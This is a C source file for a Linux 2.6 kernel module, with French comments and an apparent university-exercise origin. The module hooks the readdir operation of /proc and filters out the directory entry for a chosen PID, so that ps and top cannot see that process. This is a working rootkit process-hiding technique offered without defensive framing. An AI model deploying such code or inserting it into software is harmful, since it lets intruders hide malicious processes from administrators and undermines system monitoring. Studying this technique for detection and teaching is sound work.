/*
 * =====================================================================================
 *
 *       Filename:  hideModule-3-2.c
 *
 *    Description:  Module "module cache" pour noyau 2.6 
 *
 *        Version:  1.0
 *        Created:  09/10/2009 13:53:46
 *       Revision:  none
 *       Compiler:  gcc
 *
 *        Authors:  A. Rachid, C. Monir, 
 *        Company:  UPMC
 *
 * =====================================================================================
 */
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>

MODULE_DESCRIPTION("Module \"hide module\" pour noyau 2.6");
MODULE_AUTHOR("A. Rachid, C. Monir, UPMC");
MODULE_LICENSE("GPL");


/*
 * HEADERS
 */
int my_readdir(struct file *fp, void *buf, filldir_t filldir);
/* utilisation de u64 pour eviter les warrning du gcc */
int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x);
int _atoi(const char *s);

/* 
 * variables globales
 */
struct file_operations * proc_fops_global = NULL;
/* stocker la ref vers la vraie fonction readdir */
int (*readdir_old_global)(struct file *, void *, filldir_t);
/* stocker la ref vers la vraie fonction filldir */
filldir_t filldir_old_global;


/*
 * PARAMETRES DU MODULES
 */
/* pid du processus qu'on veut cacher */
static int pid =8200;
module_param(pid, int, 0);

/* renvoie l'objet representant /proc */
struct proc_dir_entry * find_proc_entry(void){
  struct proc_dir_entry *pere_1 = NULL;
  struct proc_dir_entry *pere = NULL;
  char * name = "hideProcess_tmp";
  struct proc_dir_entry *tmp = create_proc_entry(name, 0444, pere_1);
  printk(KERN_ALERT "[DEBUG] pere_1 = %p\n", pere_1);
  pere =  tmp->parent;
  printk(KERN_ALERT "[DEBUG] pere = %p\n", pere);
  printk(KERN_ALERT "[DEBUG] name = %s\n", tmp->name);
  remove_proc_entry(tmp->name, NULL);
  return pere;
}


/*
 * Retourne -1 si erreur. 
 */
int _atoi(const char *s){
  int num=0, i=0;
  if (s == NULL) return -1;
  while (s[i] != '\0'){  
    if(s[i] >= '0' && s[i] <= '9')
      num = num * 10 + s[i] -'0';
    else 
      return -1;
    i++;
  }
  if (i==0) return -1;
  return num;
}

int my_readdir(struct file *fp, void *buf, filldir_t filldir){  
  printk(KERN_ALERT "[DEBUG] Je suis dans la fonction my_readdir\n");
  /* sauvegarder la ref vers la vraie fonction filldir */
  filldir_old_global = filldir;
  return (*readdir_old_global)(fp, buf, my_filldir);
}


int my_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x){
  printk(KERN_ALERT "[DEBUG] Je suis dans la fonction my_filldir\n");
  /* si le pid courant est celui du processus qu'on veut cacher */
  if (_atoi(name) == pid){
    printk(KERN_ALERT "[DEBUG] Je suis dans le if. pid = %d\n",pid);
    /* dans ce cas on retourne 0. */
    /* Tous les outils style top et ps n'afficheront pas */
    /* ce processus car il n'existe pas pour eux */
    return 0;
  }
  printk(KERN_ALERT "[DEBUG] Je ne suis pas dans le if. _atoi(name) = %d\n",_atoi(name));
  /* sinon on appelle la vraie filldir */
  return (*filldir_old_global)(buf, name, nlen, off, ino, x);
}


static int hello_init(void)
{
  /* trouver la refernce vers l'objet dir_entry de /proc      */
  /* A partir de cette objet on peut trouver la ref vers      */
  /* la liste des operations sur les fichiers file_operations */
  struct proc_dir_entry * proc = find_proc_entry();
  proc_fops_global = (struct file_operations *) proc->proc_fops;
  /* la vraie fonction readdir */
  readdir_old_global = proc_fops_global->readdir;
  proc_fops_global->readdir = my_readdir;
  
  printk(KERN_ALERT "Je suis le module cache\n");
  return 0;
}


static void hello_exit(void)
{
  /* avant de enlever le module, revenir au comportement normal */
  proc_fops_global->readdir = readdir_old_global;
  printk(KERN_ALERT "Goodbye, cruel world\n");
}

module_init(hello_init);

module_exit(hello_exit);

